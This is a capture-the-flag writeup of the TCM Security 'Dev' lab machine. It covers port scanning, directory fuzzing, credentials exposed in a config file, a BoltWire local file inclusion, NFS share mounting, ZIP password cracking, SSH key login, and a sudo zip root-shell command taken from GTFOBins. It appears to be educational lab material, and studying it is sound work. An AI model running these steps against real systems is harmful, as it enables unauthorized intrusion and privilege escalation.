# TCM Dev Box — CTF Writeup

**Platform:** TCM Security  
**Difficulty:** Beginner–Intermediate  
**Author:** [Olamideoyek](https://medium.com/@olamideoyek/rooting-the-tcm-dev-box-walkthrough-34a91943b8f9)  
**Full Walkthrough (with screenshots):** [Read on Medium](https://medium.com/@olamideoyek/rooting-the-tcm-dev-box-walkthrough-34a91943b8f9)

---

## Overview

A Linux-based machine requiring enumeration of web services and NFS shares, credential harvesting, exploitation of a known LFI vulnerability, and privilege escalation via a misconfigured sudo permission on the `zip` binary.

---

## Attack Chain Summary

```
Host Discovery → Port Scan → Web Enumeration (FFUF) → Credential Discovery
→ LFI Exploit (BoltWire) → NFS Enumeration → ZIP Cracking → SSH Access → Privesc (sudo zip)
```

---

## Step 1 — Host Discovery

```bash
arp-scan -l
```

Used to identify the IP address assigned to the Dev box on the local network.

---

## Step 2 — Port Scanning & Enumeration

```bash
nmap <target-ip>
```

**Open Ports:**

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.9p1 |
| 80 | HTTP | Apache 2.4.38 — Bolt CMS (installation error) |
| 2049 | NFS | Network File System |
| 8080 | HTTP | Apache 2.4.38 / PHP 7.3.27 — potentially open proxy |

**OS:** Linux

---

## Step 3 — Web Enumeration

### Port 8080
Visiting `http://<target>:8080` revealed a static PHP info page exposing the PHP version, Apache, and MySQLi details.

### Port 80
The default page returned a Bolt CMS installation error. Directory fuzzing was performed on both ports using **FFUF**:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target>/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target>:8080/FUZZ
```

**Finding:** An `/app` directory was discovered on port 80. Inside, a `config/config.yml` file exposed plaintext credentials:

```
username: bolt
password: I_love_java
```

> The config file also documented allowed file upload extensions — useful for potential file upload attacks.

---

## Step 4 — LFI Exploitation (BoltWire)

A search for BoltWire-related exploits surfaced a known **Local File Inclusion (LFI)** vulnerability on ExploitDB, affecting **BoltWire v6.0.3** (disclosed 2020-05-04).

The exploit was executed via the browser while authenticated as the `bolt` user.

**Finding:** The LFI response leaked a system username:

```
User: jeanpaul
```

---

## Step 5 — NFS Enumeration & ZIP Cracking

### Enumerate NFS Shares
```bash
showmount -e <target-ip>
# Result: /srv/nfs is exposed to all private subnets
```

### Mount the Share
```bash
mkdir /mnt/share
mount -t nfs <target-ip>:/srv/nfs /mnt/share -o nolock
```

A file named `save.zip` was found inside the share. It was password-protected and the previously found password didn't work.

### Crack the ZIP Password
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt save.zip
# PASSWORD FOUND: java101
```

### ZIP Contents
After extraction, two files were recovered:

- **`todo.txt`** — Notes signed by initials `jp` (confirming `jeanpaul`), referencing Java and website config issues.
- **`id_rsa`** — A private SSH key for the `jeanpaul` user.

---

## Step 6 — SSH Access

```bash
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@<target-ip>
# Passphrase: I_love_java
```

The previously discovered credential `I_love_java` served as the passphrase for the private key. SSH access as `jeanpaul` was successful.

---

## Step 7 — Privilege Escalation

### Sudo Enumeration
```bash
sudo -l
```

**Finding:** `jeanpaul` can run `/usr/bin/zip` as root with no password — a clear misconfiguration.

### Exploit via GTFOBins
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

This spawned a root shell by abusing `zip`'s `-TT` flag to execute an arbitrary command as root.

**Result: Root access achieved.**

---

## Credentials & Key Findings

| Source | Username | Password / Key |
|--------|----------|----------------|
| config.yml | bolt | I_love_java |
| LFI exploit | jeanpaul | — |
| save.zip (cracked) | — | java101 |
| id_rsa passphrase | jeanpaul | I_love_java |

---

## Tools Used

- `arp-scan` — Host discovery
- `nmap` — Port scanning
- `ffuf` — Directory fuzzing
- `fcrackzip` — ZIP password cracking
- `showmount` / `mount` — NFS enumeration and mounting
- Browser / ExploitDB — LFI vulnerability research
- GTFOBins — Privilege escalation via `zip`

---

## Key Takeaways

- Credential files exposed via misconfigured web directories are a common and high-impact finding.
- LFI vulnerabilities can be used to enumerate system users even without direct file read.
- NFS shares exposed to broad subnets are a significant attack surface.
- Overly permissive `sudo` rules — especially on utilities like `zip` — should always be reviewed and restricted.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
